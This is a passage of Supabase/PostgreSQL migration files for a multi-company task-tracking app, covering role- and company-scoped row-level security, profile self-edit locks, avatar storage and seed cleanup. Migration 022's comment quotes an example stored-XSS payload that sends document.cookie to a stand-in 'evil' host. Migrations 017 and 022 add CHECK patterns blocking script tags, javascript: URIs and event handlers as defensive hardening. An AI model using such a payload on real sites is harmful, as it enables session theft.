  task_check text := 'public.current_profile_role() in (''admin'', ''construction_supervisor'', ''developer'', ''supervisor'', ''sales'')';
  worker_check text := 'public.current_profile_role() in (''admin'', ''construction_supervisor'', ''developer'', ''supervisor'', ''sales'', ''worker'')';
begin
  foreach table_name in array array['companies', 'projects', 'schedules', 'task_watchers', 'task_subtasks', 'task_activity'] loop
    execute format('drop policy if exists "role users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can delete %1$s" on public.%1$I', table_name);
    execute format('create policy "role users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, task_check);
    execute format('create policy "role users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, task_check);
    execute format('create policy "role users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, task_check);
    execute format('create policy "role users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, task_check);
  end loop;

  foreach table_name in array array['time_entries', 'active_timers', 'notifications'] loop
    execute format('drop policy if exists "role users can read %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can insert %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can update %1$s" on public.%1$I', table_name);
    execute format('drop policy if exists "role users can delete %1$s" on public.%1$I', table_name);
    execute format('create policy "role users can read %1$s" on public.%1$I for select to authenticated using (%2$s)', table_name, worker_check);
    execute format('create policy "role users can insert %1$s" on public.%1$I for insert to authenticated with check (%2$s)', table_name, worker_check);
    execute format('create policy "role users can update %1$s" on public.%1$I for update to authenticated using (%2$s) with check (%2$s)', table_name, worker_check);
    execute format('create policy "role users can delete %1$s" on public.%1$I for delete to authenticated using (%2$s)', table_name, worker_check);
  end loop;
end $$;

drop policy if exists "role users can read team_members" on public.team_members;
create policy "role users can read team_members" on public.team_members
for select to authenticated
using (public.current_profile_role() in ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales', 'worker'));

------------------------------------------------------------------------
-- 3. Self-serve display name
--    Users may update their own full_name on profiles + their own
--    team_members row (name, full_name). Managers retain full access.
------------------------------------------------------------------------
drop policy if exists "users update own profile name" on public.profiles;
create policy "users update own profile name" on public.profiles
for update to authenticated
using (auth.uid() = id)
with check (
  auth.uid() = id
  and role = (select p.role from public.profiles p where p.id = auth.uid())
  and approved = (select p.approved from public.profiles p where p.id = auth.uid())
);

drop policy if exists "users update own team_member name" on public.team_members;
create policy "users update own team_member name" on public.team_members
for update to authenticated
using (id = public.current_member_id())
with check (id = public.current_member_id());

-- ============================================================
-- 012_task_time_and_supervisor_hierarchy.sql
-- ============================================================
-- 012: Optional task time + supervisor hierarchy
--
-- This migration:
--   1. Adds an optional `due_time` (HH:MM, 24h) to tasks for the new Time field.
--   2. Adds `supervisor_id` to profiles (the per-user "reports to" override) so the
--      Team hierarchy view can render a real chain of command.
--   3. Adds a `can_view_team()` helper + a profiles SELECT policy so supervisors
--      (not just role managers) can read profiles to build their org chart.

------------------------------------------------------------------------
-- 1. Optional task time
------------------------------------------------------------------------
alter table public.tasks
  add column if not exists due_time text;

alter table public.tasks
  drop constraint if exists tasks_due_time_check;
alter table public.tasks
  add constraint tasks_due_time_check
  check (due_time is null or due_time ~ '^([01][0-9]|2[0-3]):[0-5][0-9]$');

------------------------------------------------------------------------
-- 2. Supervisor hierarchy link
------------------------------------------------------------------------
alter table public.profiles
  add column if not exists supervisor_id text references public.team_members(id);

create index if not exists profiles_supervisor_idx on public.profiles(supervisor_id);

------------------------------------------------------------------------
-- 3. Team-view access for supervisors
--    Supervisors need to read profiles (role + supervisor_id) to build the
--    org chart. Managers already can via "managers read profiles".
------------------------------------------------------------------------
create or replace function public.can_view_team()
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select public.current_profile_role() in ('admin', 'construction_supervisor', 'developer', 'supervisor');
$$;

revoke all on function public.can_view_team() from public, anon;
grant execute on function public.can_view_team() to authenticated;

drop policy if exists "team viewers read profiles" on public.profiles;
create policy "team viewers read profiles" on public.profiles
for select to authenticated
using (public.can_view_team());

-- ============================================================
-- 013_consolidate_task_children_into_jsonb.sql
-- ============================================================
-- 013: Consolidate task children into JSONB; drop the duplicate child tables
--
-- Subtasks and activity were stored in BOTH a JSONB column on `tasks` and in
-- separate child tables (task_subtasks, task_activity). The app only reads the
-- JSONB, so the tables were write-only dead weight that drifted out of sync.
-- Watchers lived only in task_watchers; this moves them to a JSONB column too so
-- a task is a single row that can be saved with one non-destructive upsert.
--
-- After this migration the client never deletes-and-reinserts child rows.

------------------------------------------------------------------------
-- 1. Add watchers JSONB and backfill from task_watchers
--    (subtasks + activity JSONB columns already exist from migration 006)
------------------------------------------------------------------------
alter table public.tasks
  add column if not exists watchers jsonb not null default '[]'::jsonb;

update public.tasks t
set watchers = coalesce((
  select jsonb_agg(w.member_id)
  from public.task_watchers w
  where w.task_id = t.id
), '[]'::jsonb);

------------------------------------------------------------------------
-- 2. Drop the now-redundant child tables.
--    CASCADE also removes the RLS policies that were attached to them
--    (e.g. the worker general-shift activity policy from migration 007).
------------------------------------------------------------------------
drop table if exists public.task_watchers cascade;
drop table if exists public.task_subtasks cascade;
drop table if exists public.task_activity cascade;

-- ============================================================
-- 014_phase3_authz_hardening.sql
-- ============================================================
-- 013: Phase 3 authz hardening
--
-- 1. Constrain profiles.role to the set of roles the app understands.
--    Without this, a manager could (accidentally or maliciously) set role to
--    an unknown string like 'super_admin' — every RLS check then treats it
--    as 'member' (no perms), but UI code may also do string compares that
--    behave unpredictably. Enforce the enum at the schema level.
-- 2. Forbid a profile from listing itself as its own supervisor (cycle of 1).
-- 3. Recreate the trigger ensuring profiles.updated_at is bumped on every
--    write — already exists per migration 005, but we re-declare defensively.

alter table public.profiles
  drop constraint if exists profiles_role_check;
alter table public.profiles
  add constraint profiles_role_check
  check (role in (
    'member', 'worker', 'sales', 'supervisor',
    'construction_supervisor', 'admin', 'developer'
  ));

alter table public.profiles
  drop constraint if exists profiles_supervisor_not_self;
alter table public.profiles
  add constraint profiles_supervisor_not_self
  check (supervisor_id is null or supervisor_id <> member_id);

-- Defense-in-depth: ensure approval status is a real boolean, not null.
alter table public.profiles
  alter column approved set not null;

-- A profile that is `approved=false` should be invisible to anyone except
-- itself and managers. The existing "users read own profile" + "managers
-- read profiles" + "team viewers read profiles" combination already covers
-- this, but team_viewers (supervisors) should not see UNAPPROVED users in
-- their org chart — that leaks pending applicants. Tighten the policy.
drop policy if exists "team viewers read profiles" on public.profiles;
create policy "team viewers read profiles" on public.profiles
for select to authenticated
using (public.can_view_team() and (approved is true or public.can_manage_roles()));

-- ============================================================
-- 015_add_profile_onboarded_flag.sql
-- ============================================================
-- 014: First-run onboarding flag
--
-- Tracks whether a user has seen the welcome tour, so it shows once per account
-- (not per device). Users can update their own flag under the existing
-- "users update own profile name" policy (it allows self-updates as long as
-- role/approved are unchanged).

alter table public.profiles
  add column if not exists onboarded boolean not null default false;

-- Existing accounts already know the app, so mark them all onboarded.
-- New signups go through handle_new_user(), which doesn't set this column, so
-- they pick up the default of false and see the welcome tour on first entry.
update public.profiles set onboarded = true where onboarded is false;

-- ============================================================
-- 016_add_profile_company.sql
-- ============================================================
-- 015: Per-user company assignment
--
-- Lets admins/supervisors mark which Quest company each person belongs to
-- (Roofing / Drafting / Lumen). The existing "managers update profiles" policy
-- already covers this column, and "users update own profile name" preserves
-- self-updates without letting users change their own role/approved/company.

alter table public.profiles
  add column if not exists company_id text references public.companies(id);

create index if not exists profiles_company_idx on public.profiles(company_id);

-- Tighten the self-update policy so users can edit their own name but cannot
-- self-assign company or supervisor (managers control those).
drop policy if exists "users update own profile name" on public.profiles;
create policy "users update own profile name" on public.profiles
for update to authenticated
using (auth.uid() = id)
with check (
  auth.uid() = id
  and role          = (select p.role          from public.profiles p where p.id = auth.uid())
  and approved      = (select p.approved      from public.profiles p where p.id = auth.uid())
  and supervisor_id is not distinct from (select p.supervisor_id from public.profiles p where p.id = auth.uid())
  and company_id    is not distinct from (select p.company_id    from public.profiles p where p.id = auth.uid())
);

-- ============================================================
-- 017_close_authz_gaps.sql
-- ============================================================
-- 017: Close authz gaps surfaced by the security audit.
--
-- 1. notifications: write-time CHECK constraint blocks <script>, javascript:
--    URIs, and on*= event handlers from ever landing in the html column. This
--    is defense-in-depth — the render path is also patched to sanitize, but
--    the database is the last line so a future render-side regression cannot
--    re-expose stored XSS.            [audit: C-1, M-3]
--
-- 2. profiles self-update: lock member_id and email in addition to the
--    role/approved/supervisor_id/company_id columns that 015 already locked.
--    Without this, a signed-in user can repoint current_member_id() at any
--    team_member id and impersonate them across time_entries / active_timers /
--    notifications RLS predicates.            [audit: C-2]
--
-- 3. tasks: replace the legacy "approved users can …" policies (from migration
--    005, never role-gated by 007) with role-aware policies. Members get no
--    access; workers can read every task and update only tasks they are the
--    assignee of (or the shared general-shift bucket); admin / construction
--    supervisor / developer / supervisor / sales get full access. Re-establishes
--    the worker general-shift carve-out that migration 013_consolidate dropped
--    along with task_activity.            [audit: C-3, H-6]
--
-- 4. team_members.color: constrain to #RRGGBB so the value cannot break out
--    of style="background:<color>" attributes. Existing rows already match
--    this shape (seeded as #RRGGBB; handle_new_user derives it from md5()).
--    [audit: H-1]

------------------------------------------------------------------------
-- 1. notifications: write-time XSS defense (C-1, M-3)
------------------------------------------------------------------------
alter table public.notifications
  drop constraint if exists notifications_safe_html;
alter table public.notifications
  add constraint notifications_safe_html
  check (
    length(coalesce(html, '')) <= 4096
    and length(coalesce(meta, '')) <= 200
    and html !~* '<\s*script\b'
    and html !~* 'javascript\s*:'
    and html !~* '\son[a-z]+\s*='
  ) not valid;

------------------------------------------------------------------------
-- 2. profiles self-update lock (C-2)
------------------------------------------------------------------------
drop policy if exists "users update own profile name" on public.profiles;
create policy "users update own profile name" on public.profiles
for update to authenticated
using (auth.uid() = id)
with check (
  auth.uid() = id
  and role          = (select p.role          from public.profiles p where p.id = auth.uid())
  and approved      = (select p.approved      from public.profiles p where p.id = auth.uid())
  and supervisor_id is not distinct from (select p.supervisor_id from public.profiles p where p.id = auth.uid())
  and company_id    is not distinct from (select p.company_id    from public.profiles p where p.id = auth.uid())
  and member_id     is not distinct from (select p.member_id     from public.profiles p where p.id = auth.uid())
  and email         is not distinct from (select p.email         from public.profiles p where p.id = auth.uid())
);

------------------------------------------------------------------------
-- 3. tasks: role-gated RLS (C-3, H-6)
------------------------------------------------------------------------
drop policy if exists "approved users can read tasks"   on public.tasks;
drop policy if exists "approved users can insert tasks" on public.tasks;
drop policy if exists "approved users can update tasks" on public.tasks;
drop policy if exists "approved users can delete tasks" on public.tasks;
drop policy if exists "role users can read tasks"       on public.tasks;
drop policy if exists "role users can insert tasks"     on public.tasks;
drop policy if exists "role users can update tasks"     on public.tasks;
drop policy if exists "role users can delete tasks"     on public.tasks;
drop policy if exists "worker can read general shift task" on public.tasks;

create policy "role users can read tasks" on public.tasks
for select to authenticated
using (
  public.current_profile_role() in
    ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales', 'worker')
);

create policy "role users can insert tasks" on public.tasks
for insert to authenticated
with check (
  public.current_profile_role() in
    ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
);

-- Workers can UPDATE only the rows they own (assignee) or the shared
-- general-shift bucket. Higher roles get unconditional UPDATE.
create policy "role users can update tasks" on public.tasks
for update to authenticated
using (
  public.current_profile_role() in
    ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
  or (
    public.current_profile_role() = 'worker'
    and (assignee_id = public.current_member_id() or id = 'general-shift')
  )
)
with check (
  public.current_profile_role() in
    ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
  or (
    public.current_profile_role() = 'worker'
    and (assignee_id = public.current_member_id() or id = 'general-shift')
  )
);

create policy "role users can delete tasks" on public.tasks
for delete to authenticated
using (
  public.current_profile_role() in
    ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
);

------------------------------------------------------------------------
-- 4. team_members.color: strict hex format (H-1)
------------------------------------------------------------------------
alter table public.team_members
  drop constraint if exists team_members_color_format;
alter table public.team_members
  add constraint team_members_color_format
  check (color ~ '^#[0-9A-Fa-f]{6}$');

-- ============================================================
-- 018_add_task_cleared_at.sql
-- ============================================================
-- 018: Soft-clear with auto-purge.
--
-- Adds `cleared_at` so a user can hide a batch of done tasks from the list
-- without losing them immediately. The client filters rows where cleared_at
-- IS NOT NULL out of every view, and a boot-time purge deletes rows whose
-- cleared_at is older than 30 days. That gives a one-month "oops, didn't
-- mean it" grace period before the rows are gone for good.
--
-- The DELETE happens via the existing "role users can delete tasks" policy
-- from migration 017, so this migration only adds the column. Make sure 017
-- is applied before relying on the purge.

alter table public.tasks
  add column if not exists cleared_at timestamptz;

-- Index supports the purge's `where cleared_at < now() - interval '30 days'`
-- scan and the client's `is null` filter without a full sequential scan.
create index if not exists tasks_cleared_at_idx
  on public.tasks(cleared_at)
  where cleared_at is not null;

-- ============================================================
-- 019_add_profile_avatar.sql
-- ============================================================
-- 019: Self-serve profile editing — display name + uploaded avatar.
--
-- 1. profiles.avatar_url
--    Source-of-truth URL for a user's uploaded photo. The existing
--    "users update own profile name" policy (017) allow-lists self-edits
--    by locking sensitive columns (role / approved / supervisor / company /
--    member_id / email). avatar_url is not in the locked list, so users
--    can self-update it through that same policy without further changes.
--
-- 2. team_members.avatar_url
--    Mirror column so the photo also shows in task lists, assignee picker,
--    watcher chips, etc. (those views read from team_members via
--    App.PEOPLE). The "users update own team_member name" policy (011)
--    already allows the row owner to update any column of their own row.
--
-- 3. Storage bucket "avatars"
--    Public-read bucket. RLS on storage.objects scopes writes to
--    <auth.uid()>/* so a user can only manage files under their own
--    folder. Reads are open to any authenticated user — once a user
--    chooses to upload an avatar they're opting into in-app visibility.

alter table public.profiles
  add column if not exists avatar_url text;

alter table public.team_members
  add column if not exists avatar_url text;

insert into storage.buckets (id, name, public)
values ('avatars', 'avatars', true)
on conflict (id) do update set public = excluded.public;

drop policy if exists "users can upload own avatar" on storage.objects;
create policy "users can upload own avatar" on storage.objects
  for insert to authenticated
  with check (
    bucket_id = 'avatars'
    and (storage.foldername(name))[1] = auth.uid()::text
  );

drop policy if exists "users can update own avatar" on storage.objects;
create policy "users can update own avatar" on storage.objects
  for update to authenticated
  using (
    bucket_id = 'avatars'
    and (storage.foldername(name))[1] = auth.uid()::text
  );

drop policy if exists "users can delete own avatar" on storage.objects;
create policy "users can delete own avatar" on storage.objects
  for delete to authenticated
  using (
    bucket_id = 'avatars'
    and (storage.foldername(name))[1] = auth.uid()::text
  );

drop policy if exists "authenticated users can view avatars" on storage.objects;
create policy "authenticated users can view avatars" on storage.objects
  for select to authenticated
  using (bucket_id = 'avatars');

-- ============================================================
-- 020_clear_seed_data.sql
-- ============================================================
-- 020: Clear placeholder seed data so the live app shows only the data
--      real signed-up users have created.
--
-- WHAT GETS REMOVED
--   * The 15 demo tasks (t1..t15) from migration 004, along with
--     their time_entries / active_timers / notifications (those
--     cascade via the ON DELETE CASCADE FKs on task_id defined in
--     migration 003). Subtasks / activity / watchers live inside
--     the tasks row itself as JSONB columns (migrations 006 + 013),
--     so they're removed automatically when the task row is deleted.
--   * The 6 hardcoded team_members from migration 003
--     (abraham, alkeith, kristine, jesus, andres, adrian).
--
-- WHAT IS KEPT
--   * Any task / time entry / notification that was NOT part of the
--     original seed — i.e. anything created in the live app by real
--     signups.
--   * Any team_members row that is backed by a real `profiles` row
--     (a seeded id like 'abraham' that a real user actually claimed
--     via signup is preserved).
--
-- SAFETY
--   * Wrapped in a transaction — commits only if every step succeeds.
--   * Team_members deletion is guarded by NOT EXISTS on every table
--     and JSONB column that references team_members.id, so a seeded
--     row that is still load-bearing for real data is left intact
--     rather than orphaning it. The query is a no-op on re-run.

begin;

-- 1. Drop the demo tasks. ON DELETE CASCADE on every task_id FK takes
--    out time_entries, active_timers, and notifications addressed to
--    those tasks. Subtasks / activity / watchers go with the row
--    since they live in JSONB columns on tasks itself.
delete from public.tasks
where id in ('t1','t2','t3','t4','t5','t6','t7','t8','t9','t10',
             't11','t12','t13','t14','t15');

-- Belt + suspenders: the seeded time_entries (e1..e7) were keyed to
-- demo tasks and so already went via the cascade. This catch-all
-- removes them if any were manually re-pointed at a real task before
-- the cleanup ran.
delete from public.time_entries
where id in ('e1','e2','e3','e4','e5','e6','e7');

-- 2. Drop the seeded team_members. The ON DELETE behaviour for the
--    member-side FKs is RESTRICT, so each NOT EXISTS check is required.
--    The watchers check uses the JSONB `?` operator (top-level
--    element test on a string array) since migration 013 collapsed
--    the task_watchers table into a JSONB column on tasks.
delete from public.team_members tm
where tm.id in ('abraham','alkeith','kristine','jesus','andres','adrian')
  and not exists (select 1 from public.profiles      p where p.member_id   = tm.id)
  and not exists (select 1 from public.tasks         t where t.assignee_id = tm.id or t.creator_id = tm.id or t.watchers ? tm.id)
  and not exists (select 1 from public.time_entries  e where e.user_id     = tm.id)
  and not exists (select 1 from public.active_timers a where a.user_id     = tm.id)
  and not exists (select 1 from public.notifications n where n.member_id   = tm.id);

commit;

-- After running, verify with:
--   select id, name, email from public.team_members order by id;
--   select count(*) from public.tasks;
-- The team_members list should contain only profile-backed users.

-- ============================================================
-- 021_profile_company_ids.sql
-- ============================================================
-- 021: Multi-company profile membership.
--
-- Replaces profiles.company_id (single FK) with profiles.company_ids
-- (text[]) so a person can belong to 0..N Quest companies — e.g.
-- someone who works both Roofing and Drafting jobs.
--
-- The single-FK column was added by migration 016 and locked by the
-- "users update own profile name" self-update policy in 017 (so a user
-- can't grant themselves a company). This migration preserves both
-- properties for the array column.

begin;

-- 1. Add the array column. NOT NULL with default '{}' so existing
--    rows pick up a valid empty array immediately (no NULL ambiguity
--    downstream in `is not distinct from` checks).
alter table public.profiles
  add column if not exists company_ids text[] not null default '{}';

-- 2. Backfill from the single column. A row with company_id = 'roofing'
--    becomes company_ids = '{"roofing"}'. NULL company_id stays as the
--    empty array default.
update public.profiles
set company_ids = array[company_id]
where company_id is not null
  and not (company_id = any(company_ids));

-- 3. Drop the dependent self-update policy first — it has a WITH CHECK
--    clause that references company_id, so dropping the column without
--    dropping the policy errors with "cannot drop columns referenced
--    by policy".
drop policy if exists "users update own profile name" on public.profiles;

-- Single-column index from 016, no longer needed.
drop index if exists public.profiles_company_idx;

alter table public.profiles drop column if exists company_id;

-- 4. Recreate the self-update policy with the same allow-list shape
--    as 017, just with company_ids replacing company_id. is-not-distinct
--    handles NULL/empty-array equality correctly and array equality is
--    element-wise, so a user can't quietly grant themselves another
--    company.
create policy "users update own profile name" on public.profiles
for update to authenticated
using (auth.uid() = id)
with check (
  auth.uid() = id
  and role          = (select p.role          from public.profiles p where p.id = auth.uid())
  and approved      = (select p.approved      from public.profiles p where p.id = auth.uid())
  and supervisor_id is not distinct from (select p.supervisor_id from public.profiles p where p.id = auth.uid())
  and company_ids   is not distinct from (select p.company_ids   from public.profiles p where p.id = auth.uid())
  and member_id     is not distinct from (select p.member_id     from public.profiles p where p.id = auth.uid())
  and email         is not distinct from (select p.email         from public.profiles p where p.id = auth.uid())
);

-- 5. GIN index for fast "find all profiles in company X" lookups via
--    the `?` / `&&` / `@>` array operators.
create index if not exists profiles_company_ids_idx
  on public.profiles using gin (company_ids);

commit;

-- ============================================================
-- 022_avatar_url_safe.sql
-- ============================================================
-- 022: Defense-in-depth CHECK constraint on avatar_url columns.
--
-- profiles.avatar_url and team_members.avatar_url are user-writable
-- text columns (the row owner self-updates them through migrations
-- 017 + 011's policies — avatar_url is intentionally not on either
-- policy's locked-fields list so the Profile modal can save a new
-- photo).
--
-- The intended value is a Supabase Storage URL like
--   https://<project>.supabase.co/storage/v1/object/public/avatars/<uid>/avatar.jpg
-- written by ProfileView after a successful file upload. But a
-- determined caller can POST any string directly to the Supabase
-- REST endpoint, including a payload like
--   "><script>fetch('//evil/?'+document.cookie)</script>
-- which a future renderer that forgets to escape would execute.
--
-- The render paths today are safe — auth-guard.js uses the DOM API
-- (after the 172f3fa fix) and ProfileView.js uses App.utils.escapeHtml.
-- This migration is the database-side backstop: bad values can't
-- physically land in the columns at all, so even a future rendering
-- regression can't be exploited.
--
-- Mirrors the shape and rationale of notifications_safe_html from
-- migration 017. `not valid` matches that migration's pattern so the
-- constraint protects new writes immediately without scanning the
-- existing rows; run `alter table ... validate constraint ...`
-- manually if you want to confirm legacy rows pass.

alter table public.profiles
  drop constraint if exists profiles_avatar_url_safe;
alter table public.profiles
  add constraint profiles_avatar_url_safe
  check (
    avatar_url is null
    or (
      length(avatar_url) <= 500
      and avatar_url ~ '^https://'
      and avatar_url !~* '<\s*script\b'
      and avatar_url !~* 'javascript\s*:'
      and avatar_url !~* '\son[a-z]+\s*='
    )
  ) not valid;

alter table public.team_members
  drop constraint if exists team_members_avatar_url_safe;
alter table public.team_members
  add constraint team_members_avatar_url_safe
  check (
    avatar_url is null
    or (
      length(avatar_url) <= 500
      and avatar_url ~ '^https://'
      and avatar_url !~* '<\s*script\b'
      and avatar_url !~* 'javascript\s*:'
      and avatar_url !~* '\son[a-z]+\s*='
    )
  ) not valid;

-- ============================================================
-- 023_add_website_company.sql
-- ============================================================
-- 023: Add the "Website" company row.
--
-- Mirrors the original 003 seed for the three companies: each row in
-- public.companies pairs an id (referenced by tasks.company_id) with
-- a display label and a CSS pill class (rendered in chips / sidebar
-- dots). Idempotent — re-running this migration is a no-op.

insert into public.companies (id, label, pill)
values ('website', 'Website', 'pill-website')
on conflict (id) do update set
  label = excluded.label,
  pill  = excluded.pill;

-- ============================================================
-- 024_allow_role_managers_delete_profiles.sql
-- ============================================================
-- 024: Let role managers delete profiles (remove a user's access).
--
-- profiles has SELECT (007/012/014) and UPDATE (007/016/017/021) policies
-- but no DELETE policy, so the Approvals "Delete" button needs one. Mirror
-- the team_members manager-delete policy from 007: gate to can_manage_roles()
-- (admin / construction_supervisor). The "id <> auth.uid()" guard stops a
-- manager from deleting their own profile and locking themselves out — the
-- UI hides its own Delete button too, but RLS is the real wall.
--
-- We intentionally delete only the profile, not the team_members row: that
-- row is referenced by NOT NULL FKs on tasks.creator_id / assignee_id (003)
-- with no cascade, so removing it would orphan those tasks. Dropping just
-- the profile revokes app access (no profile => not approved => gated by
-- AuthModel.isApproved) and removes the person from the Approvals list,
-- while their name still renders on any historical tasks. Idempotent.

drop policy if exists "managers can delete profiles" on public.profiles;
create policy "managers can delete profiles" on public.profiles
for delete to authenticated
using (public.can_manage_roles() and id <> auth.uid());

-- ============================================================
-- 025_prune_orphan_team_members.sql
-- ============================================================
-- 025: Prune orphan team_members so the assignee picker matches the
--      real, approved user list.
--
-- The "Assigned to" dropdown is built from public.team_members (App.PEOPLE),
-- while the Approvals screen is built from public.profiles. They drift apart
-- because team_members accumulates rows that no longer map to a login:
--   * leftover demo seeds from migration 003 (jesus, kristine, abraham, ...)
--     if migration 020 was never run, and
--   * members whose profile was deleted via the Approvals "Delete" button
--     (024) — that drops the profile but, by design, keeps the team_member
--     so historical tasks don't break, leaving a ghost in the picker.
--
-- This generalises migration 020: instead of targeting six hardcoded seed
-- ids, it removes EVERY team_member that has no backing profile AND is not
-- referenced anywhere (tasks creator/assignee/watchers, time_entries,
-- active_timers, notifications). The NOT EXISTS guards make it safe — a row
-- still load-bearing for real data is left intact rather than orphaning it
-- (the member-side FKs are ON DELETE RESTRICT, so an unguarded delete would
-- error anyway). Wrapped in a transaction; idempotent / no-op on re-run.

begin;

delete from public.team_members tm
where not exists (select 1 from public.profiles      p where p.member_id   = tm.id)
  and not exists (select 1 from public.tasks         t where t.assignee_id = tm.id or t.creator_id = tm.id or t.watchers ? tm.id)
  and not exists (select 1 from public.time_entries  e where e.user_id     = tm.id)
  and not exists (select 1 from public.active_timers a where a.user_id     = tm.id)
  and not exists (select 1 from public.notifications n where n.member_id   = tm.id);

commit;

-- Verify with:
--   select id, name, email from public.team_members order by id;
-- Every row left should be backed by a profile or referenced by real data.

-- ============================================================
-- 026_allow_web_dev_task_type.sql
-- ============================================================
-- 026: Allow the 'web_dev' task type.
--
-- The client added a "Web development" task type (App.TASK_TYPES.web_dev),
-- but the tasks_type_check constraint from migration 011 still only allowed
-- ('lead','bid','admin','invoicing','ar','meeting'). Creating a task of that
-- type therefore failed with: new row for relation "tasks" violates check
-- constraint "tasks_type_check". Widen the allow-list to include 'web_dev'.
-- Idempotent — drops and recreates the named constraint.

alter table public.tasks
  drop constraint if exists tasks_type_check;

alter table public.tasks
  add constraint tasks_type_check
  check (type in ('lead', 'bid', 'admin', 'invoicing', 'ar', 'meeting', 'web_dev'));

-- ============================================================
-- 027_remove_website_company.sql
-- ============================================================
-- 027: Remove the "Website" company (reverses migration 023).
--
-- tasks.company_id is a NOT NULL FK to companies(id) with no cascade (003),
-- so the company row can't be dropped while tasks still point at it. Per the
-- decision to keep that work, first reassign every Website task to Lumen,
-- then strip 'website' from each profile's company_ids access array, then
-- delete the company row. Wrapped in a transaction so it's all-or-nothing;
-- idempotent (a re-run finds nothing left to change).

begin;

-- 1. Move Website tasks to Lumen so the FK no longer blocks the delete.
update public.tasks
  set company_id = 'lumen'
  where company_id = 'website';

-- 2. Revoke Website from anyone who had it in their company access list.
update public.profiles
  set company_ids = array_remove(company_ids, 'website')
  where 'website' = any(company_ids);

-- 3. Drop the company row itself.
delete from public.companies where id = 'website';

commit;

-- ============================================================
-- 028_company_scoping_rls.sql
-- ============================================================
-- 028: Company scoping (multi-tenant data isolation) for tasks.
--
-- Until now the tasks RLS policies (migration 017) gated access by ROLE only,
-- so any admin/supervisor could read and write tasks in EVERY company through
-- the API. The product now requires per-company isolation enforced at the data
-- layer. This migration adds public.current_company_ids() and rewrites the four
-- tasks policies so that, on top of the role gate, every non-developer is
-- confined to tasks whose company_id is one of their profiles.company_ids.
-- Within that company window, row visibility is further narrowed by role:
--
--   worker     -> only tasks assigned to them (+ shared general-shift)
--   supervisor -> tasks assigned to/created by them, or assigned to a direct
--                 report (profiles.supervisor_id = caller's member_id)
--   admin      -> all tasks in their companies
--   developer  -> ALL tasks, ALL companies (company gate bypassed = god mode)
--
-- It also OPENS task INSERT to workers (previously blocked), constrained to
-- their own companies, because workers now create tasks.
--
-- Identity mapping: tasks.assignee_id / creator_id -> team_members.id;
-- profiles.member_id -> team_members.id; a supervisor's reports are profiles
-- whose supervisor_id equals the supervisor's member_id.
--
-- general-shift (the shared clock-in bucket, company 'roofing') keeps a
-- carve-out so any worker can read/update it regardless of company access.
--
-- Retired role names (construction_supervisor, sales) are left in the IN(...)
-- lists: once no profile holds them they are inert, and keeping them avoids
-- surprise lockouts if this runs before everyone is migrated.
--
-- time_entries / active_timers / notifications are intentionally left
-- owner-scoped (migration 008): a user only ever sees their own rows, so no
-- cross-company task data leaks through them. Task isolation is the hard
-- requirement and is what this migration enforces.
--
-- Transaction-wrapped; all policies dropped before recreate; idempotent.

begin;

------------------------------------------------------------------------
-- 1. Helper: the caller's company access list.
--    SECURITY DEFINER + STABLE + locked search_path, mirroring
--    current_profile_role() / current_member_id() from migration 007.
--    Coalesced to '{}' so `= any(...)` is well-defined (fails closed)
--    for a missing/anon profile.
------------------------------------------------------------------------
create or replace function public.current_company_ids()
returns text[]
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select coalesce(
    (select p.company_ids from public.profiles p where p.id = auth.uid()),
    '{}'::text[]
  );
$$;

revoke all on function public.current_company_ids() from public, anon;
grant execute on function public.current_company_ids() to authenticated;

-- Supports the supervisor EXISTS subquery below (only supervisor_id was indexed).
create index if not exists profiles_member_id_idx on public.profiles(member_id);

------------------------------------------------------------------------
-- 2. Rewrite tasks policies (supersedes 017:73-113).
------------------------------------------------------------------------
drop policy if exists "role users can read tasks"          on public.tasks;
drop policy if exists "role users can insert tasks"        on public.tasks;
drop policy if exists "role users can update tasks"        on public.tasks;
drop policy if exists "role users can delete tasks"        on public.tasks;
drop policy if exists "worker can read general shift task" on public.tasks;

----------------------------------------------------------------
-- SELECT
----------------------------------------------------------------
create policy "role users can read tasks" on public.tasks
for select to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
        and (assignee_id = public.current_member_id() or id = 'general-shift')
      )
    )
  )
);

----------------------------------------------------------------
-- INSERT  (workers now allowed, scoped to their companies)
----------------------------------------------------------------
create policy "role users can insert tasks" on public.tasks
for insert to authenticated
with check (
  public.current_profile_role() = 'developer'
  or (
    company_id = any(public.current_company_ids())
    and public.current_profile_role() in
      ('admin', 'supervisor', 'worker', 'construction_supervisor', 'sales')
  )
);

----------------------------------------------------------------
-- UPDATE  (same visibility rule on both sides of the lock; the
--          with-check also blocks moving a task into a company
--          you don't belong to)
----------------------------------------------------------------
create policy "role users can update tasks" on public.tasks
for update to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
